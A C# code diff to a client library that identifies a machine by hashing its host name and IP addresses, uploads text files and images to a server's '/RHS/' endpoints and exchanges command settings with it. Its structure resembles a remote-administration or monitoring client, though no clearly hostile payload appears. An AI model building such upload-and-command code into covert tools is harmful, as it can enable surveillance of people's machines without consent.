@@ -209,14 +209,15 @@ namespace Library
 
         public void SetHasExectuted(Settings settings)
         {
-            //    settings.HasExectuted = true;
-            settings.Command = ECommand.DO_NOTHING;
-            var request = new RestRequest("/RHS/SaveSettings", Method.POST);
+            settings.ComputerHash = null;
+            settings.Command = ECommand.DoNothing;
+            var request = new RestRequest("/RHS/SaveSettings/{settingsEncoded}", Method.POST);
             try
             {
-                request.AddParameter("settingsEncoded", settings);
+                request.ReadWriteTimeout = 30000;
+                request.Timeout = 30000;
+                request.AddObject(settings);
                 var response = client.Execute(request);
-                //return response.StatusCode;
             }
             catch (Exception ex) { }
         }
@@ -235,24 +236,39 @@ namespace Library
             return General.Sha1Hash(Auth.HostName + Auth.IpExternal + Auth.IpInternal);
         }
 
-        public string UploadData(string filename, object objData, bool useCompression)
+        public string UploadData(string filename, object objData, bool useCompression, bool isTextFile = true)
         {
             string content = String.Empty;
             try
             {
-                var bytes = Encoding.Default.GetBytes(Convert.ToString(objData));
-                var image = objData as Bitmap;
-                if (image != null)
-                {
-                    bytes = image.ImageToByte();
-                }
-                var bytesToTransfer = useCompression ? Compression.Compress("file", bytes) : bytes;
+                
+                //var image = objData as Bitmap;
+                //if (image != null)
+                //{
+                //    bytes = image.ImageToByte();
+                //}
                 //bytesToTransfer = bytesToTransfer.Length < bytes.Length ? bytesToTransfer : bytes;
-                var request = new RestRequest("/RHS/UploadFile/{data}", Method.POST);
+                RestRequest request = null;
+                if (isTextFile)
+                {
+                    request = new RestRequest("/RHS/UploadFile/{data}", Method.POST);
+                    var bytes = Encoding.Default.GetBytes(Convert.ToString(objData));
+                    var bytesToTransfer = useCompression ? Compression.Compress("file", bytes) : bytes;
+                    request.AddObject(new FileData(filename, bytesToTransfer, TSettings.ComputerHash));
+                }
+                else
+                {
+                    request = new RestRequest("/RHS/UploadImage/{data}", Method.POST);
+                    request.AddObject(new ImageData()
+                    {
+                        FileName = filename,
+                        Image = Convert.ToBase64String((byte[])objData),
+                        Token = Auth.Token,
+                        ComputerHash = TSettings.ComputerHash
+                    });
+                }
                 request.ReadWriteTimeout = 30000;
                 request.Timeout = 30000;
-                var data = new FileData(filename, bytesToTransfer, TSettings.ComputerHash);
-                request.AddObject(data);
                 var response = client.Execute(request);
                 content = response.Content;
             }
@@ -270,14 +286,13 @@ namespace Library
             {
                 var imgArray = Imaging.BitmapToJpeg(bitmapImage, quality);
                 var request = new RestRequest("/RHS/UploadImage/{data}", Method.POST);
-                var data = new ImageData()
+                request.AddObject(new ImageData()
                 {
                     FileName = fileName,
                     Image = Convert.ToBase64String(imgArray),
-                    Token = Auth.Token
-                };
-                data.ComputerHash = TSettings.ComputerHash;
-                request.AddObject(data);
+                    Token = Auth.Token,
+                    ComputerHash = TSettings.ComputerHash
+                });
                 var response = client.Execute(request);
                 return response.Content != null && response.Content.Length > 0;
             }
@@ -335,7 +350,7 @@ namespace Library
 
         //public ECommand GetCommand()
         //{
-        //    var command = ECommand.DO_NOTHING;
+        //    var command = ECommand.DoNothing;
         //    var request = new RestRequest("/command/{tokenValue}", Method.GET);
         //    request.Timeout = ConnectionTimeout;
         //    if (request.Attempts > 1)
